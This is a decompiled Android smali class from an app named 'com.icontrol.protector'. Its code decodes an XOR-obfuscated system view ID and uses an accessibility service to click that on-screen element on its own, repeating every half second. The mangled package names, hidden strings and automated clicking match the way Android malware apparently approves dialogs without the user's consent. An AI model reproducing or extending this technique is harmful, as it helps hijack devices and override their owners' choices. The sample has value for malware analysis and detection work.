.class Lcom/icontrol/protector/m$s$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/m$s;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lcom/icontrol/protector/m$s;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/m$s;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/m$s$a;->e:Lcom/icontrol/protector/m$s;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    const/16 v1, 0x12

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    const/16 v1, 0x10

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_0
    iget-object v0, p0, Lcom/icontrol/protector/m$s$a;->e:Lcom/icontrol/protector/m$s;

    iget-object v0, v0, Lcom/icontrol/protector/m$s;->e:Landroid/os/Handler;

    new-instance v1, Lcom/icontrol/protector/m$s$a$a;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/m$s$a$a;-><init>(Lcom/icontrol/protector/m$s$a;)V

    const-wide/16 v2, 0x1f4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :array_0
    .array-data 1
        0x3t
        0x2et
        0x53t
        0x7et
        -0x67t
        0xet
        0x2bt
        -0x32t
        0xbt
        0x24t
        0x18t
        0x6et
        -0x7dt
        0x13t
        0x3bt
        -0x65t
        0xct
        0x71t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x62t
        0x40t
        0x37t
        0xct
        -0xat
        0x67t
        0x4ft
        -0xct
    .end array-data
.end method
